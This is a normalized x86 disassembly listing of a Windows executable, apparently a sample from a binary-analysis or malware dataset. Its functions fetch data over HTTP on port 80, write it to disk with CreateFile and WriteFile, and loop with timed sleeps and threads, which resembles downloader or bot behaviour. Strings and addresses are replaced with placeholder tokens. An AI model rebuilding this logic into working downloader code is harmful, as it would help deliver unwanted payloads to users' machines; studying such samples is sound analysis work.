call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov ecx [ esi ]
push esi
mov [ rw-data ] ecx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop esi
pop ecx
retn
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_402440
sub esp 0x58c
push esi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov [ esp + 0x8 ] eax
call [ FreeLibrary@IAT ]
push 0x3e800
call [ malloc@IAT ]
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
jne r-xdata
push ebx
push ebp
push edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x19c ]
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
mov ebp [ sprintf@IAT ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebx ecx
or ecx 0xffffffff
inc ebx
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x19c ]
mov eax ecx
mov esi edi
mov edi edx
mov edx [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi rw-data
lea ebx [ ebx + ecx + 0x1 ]
mov ecx 0x27
lea edi [ esp + ebx + 0x19c ]
add ebx 0x9c
[ edi ] [ esi ]
mov cx [ rw-data ]
lea edi [ esp + 0x27 ]
mov [ esp + ebx + 0x19c ] cx
mov ecx [ rw-data ]
add ebx 0x2
test edx edx
setne al
mov [ esp + ebx + 0x19c ] al
mov eax [ rw-data ]
inc ebx
mov [ esp + 0x1c ] eax
mov ax [ rw-data ]
mov [ esp + ebx + 0x19c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x20 ] ecx
mov cl [ rw-data ]
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] cl
mov ecx 0x1d
xor eax eax
[ edi ]
add ebx 0x4
test edx edx
stosb [ edi ]
je r-xdata
pop esi
add esp 0x58c
retn
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x9c ]
push ecx
push rw-data
push rw-data
push edx
call ebp
lea edi [ esp + 0xac ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x19c ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x9c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
call [ esp + 0x10 ]
xor edx edx
mov esi 0x36ee80
mov ecx eax
div esi
mov eax 0x45e7b273
mul edx
shr edx 0xe
mov eax 0x95217cb1
push edx
mul ecx
shr edx 0x15
push edx
lea ecx [ esp + 0xa4 ]
push rw-data
push ecx
call ebp
lea edi [ esp + 0xac ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x1ac ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xac ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xac ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
lea ebx [ ebx + ecx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push 0x2f
[ edi ] [ esi ]
lea ecx [ esp + 0xb0 ]
push ecx
call [ strrchr@IAT ]
mov edx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x18
lea ebp [ esp + ebx + 0x19c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
je r-xdata
mov edx [ rw-data ]
lea eax [ esp + 0x1c ]
push edx
push rw-data
push rw-data
push eax
call ebp
add esp 0x10
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x19c ]
[ edi ]
not ecx
sub edi ecx
push 0x1
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x1a0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov edi [ esp + 0x18 ]
mov eax [ rw-data ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
lea ecx [ esp + 0x1c ]
push ecx
push edi
push ebx
push edx
push rw-data
push 0x50
push eax
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_4021a0
push edi
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop ebp
pop ebx
pop esi
add esp 0x58c
retn
lea edi [ esp + 0x9c ]
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x9c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ecx ebx
lea ebx [ ecx + edx + 0x1 ]
sub_4027c0
push ecx
push esi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
push edi
push ecx
push esi
call sub_402830
push esi
mov edi eax
call [ free@IAT ]
add esp 0xc
mov eax edi
pop edi
pop esi
pop ecx
retn
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_402830
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebp ebp
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
add ecx ebp
pop esi
pop ebp
pop ebx
mov ecx [ ecx + edx + 0x1 ]
mov edx [ rw-data ]
cmp ecx edx
sete al
retn
inc ebp
cmp ebp edi
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov esi rw-data
lea eax [ edx + ebp ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_4028b0
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebp eax
call [ FreeLibrary@IAT ]
mov ebx [ esp + 0x18 ]
xor esi esi
lea edi [ ebx + ebx * 4 + 0x3a98 ]
shl edi 0x1
call ebp
test ebx ebx
mov [ rw-data ] eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebp [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov eax ebx
sub eax esi
push 0x0
lea ecx [ esi + ebp ]
push eax
push ecx
push edx
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
add esi eax
mov eax ebx
sub eax esi
add eax 0xbb8
lea edi [ eax + eax * 4 ]
shl edi 0x1
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
push 0x1
call [ rw-data ]
mov eax edi
dec edi
test eax eax
je r-xdata
jmp r-xdata
cmp esi ebx
jl r-xdata
sub_402970
sub esp 0x200
push esi
mov esi [ esp + 0x208 ]
cmp [ esi ] 0x41
je r-xdata
push edi
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x8 ]
mov edx [ rw-data ]
[ edi ]
mov ecx [ esi + 0x1 ]
push ecx
push 0x1
push rw-data
push 0x51
push edx
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ esp + 0x1c ]
push eax
call sub_403460
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x24 ]
push ecx
call sub_4028b0
add esp 0x20
test eax eax
pop edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x20c ]
push edx
push esi
call sub_4028b0
add esp 0x8
pop esi
add esp 0x200
retn
pop esi
add esp 0x200
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] 0x0
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_403920
test eax eax
jne r-xdata
push 0x1
call [ rw-data ]
mov eax [ rw-data ]
test eax eax
je r-xdata
pop esi
add esp 0x200
retn
sub_402a50
push ecx
push ebx
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop ebx
pop ecx
retn
lea eax [ esp + 0x4 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
sub_402ad0
sub esp 0x408
push ebx
push ebp
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
push ebp
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
mov ecx [ esp + 0x10 ]
mov esi rw-data
mov eax ebp
mov [ ecx + ebp ] 0x0
push ebp
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
push ebp
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x2
push 0x2
mov ecx ebx
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x2c ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push edx
push ebp
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ rw-data ]
test edi edi
jne r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
call sub_406c10
push ebp
call [ free@IAT ]
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
push ebp
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
sub_402ca0
sub esp 0x408
push ebx
push ebp
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
mov ecx [ esp + 0x10 ]
mov esi rw-data
mov eax ebx
mov [ ecx + ebx ] 0x0
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
lea ebp [ ebx - 0x2 ]
mov [ ecx + ebx ] 0x0
mov edx [ esp + 0x10 ]
add edx ebx
cmp ebp edx
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
test ebp ebp
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
lea edi [ ebp + 0x2 ]
push 0xd
push edi
call [ strchr@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov esi rw-data
mov ecx edi
mov [ ebp ] 0x0
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
lea edx [ esp + 0x10 ]
push 0x0
push edx
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
add ecx ebx
cmp ebp ecx
jb r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl al
cmp al [ esi + 0x1 ]
jne r-xdata
lea eax [ esp + 0x18 ]
push 0x400
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x2
push 0x2
mov ecx ebp
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x2c ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push edx
push ebx
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ rw-data ]
test edi edi
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
mov al [ ecx ]
mov dl al
cmp al [ esi ]
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
call sub_406c10
push ebx
call [ free@IAT ]
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
sub_402f20
sub esp 0x408
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
lea eax [ esp + 0xc ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x408
retn
push ebp
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x2
push 0x2
mov ecx ebp
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x2c ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ rw-data ]
mov esi eax
pop ebp
cmp esi 0xffffffff
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x408
retn
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push edx
push ebx
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ rw-data ]
test edi edi
push ebx
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x408
retn
call [ free@IAT ]
lea eax [ esp + 0x18 ]
push eax
call sub_406c10
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x408
retn
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x408
retn
sub_403060
sub esp 0x408
push ebx
push ebp
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
mov ecx [ esp + 0x10 ]
lea ebp [ ebx - 0x2 ]
mov [ ecx + ebx ] 0x0
mov edx [ esp + 0x10 ]
add edx ebx
cmp ebp edx
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
test ebp ebp
je r-xdata
lea edi [ ebp + 0x2 ]
push 0xd
push edi
call [ strchr@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov esi rw-data
mov ecx edi
mov [ ebp ] 0x0
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
lea edx [ esp + 0x10 ]
push 0x0
push edx
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4021a0
add esp 0x20
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
add ecx ebx
cmp ebp ecx
jb r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl al
cmp al [ esi + 0x1 ]
jne r-xdata
lea eax [ esp + 0x18 ]
push 0x400
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x2
push 0x2
mov ecx ebp
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x2c ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push edx
push ebx
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ rw-data ]
test edi edi
push ebx
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
mov al [ ecx ]
mov dl al
cmp al [ esi ]
jne r-xdata
call [ free@IAT ]
lea eax [ esp + 0x1c ]
push eax
call sub_406c10
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
sub_403250
sub esp 0x408
lea eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
push 0x400
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ rw-data ]
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ rw-data ]
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
push eax
call [ rw-data ]
mov edi [ Ordinal_WSOCK32_12@IAT ]
mov ebp [ CreateThread@IAT ]
xor ebx ebx
mov esi 0x1
push 0x32
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ rw-data ]
call sub_402ad0
test eax eax
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
call sub_402ca0
test eax eax
jne r-xdata
call sub_4023d0
test eax eax
jne r-xdata
call sub_402440
test eax eax
jne r-xdata
push 0x1d4c0
call [ rw-data ]
jmp r-xdata
call sub_4027c0
test eax eax
jne r-xdata
push 0x2710
call [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
call sub_403920
test eax eax
jne r-xdata
push 0x2710
call [ rw-data ]
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x8004667e
push edx
mov [ esp + 0x1c ] esi
call edi
lea eax [ esp + 0x14 ]
mov [ rw-data ] esi
push eax
push ebx
push ebx
push r-xdata
push ebx
push ebx
mov [ rw-data ] bl
call ebp
mov [ rw-data ] esi
push 0x2710
call [ rw-data ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
call sub_403b50
push esi
call [ rw-data ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
sub_403460
sub esp 0x10
mov ecx [ esp + 0x1c ]
push ebx
push esi
push edi
lea eax [ esp + 0xd ]
push 0xa
push eax
push ecx
mov [ esp + 0x18 ] 0x3a
call [ _itoa@IAT ]
mov edx [ esp + 0x3c ]
add esp 0xc
test edx edx
mov edi rw-data
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x20 ]
push ebp
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi rw-data
mov edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
pop ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0xa
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x3c ]
push ecx
call [ _itoa@IAT ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
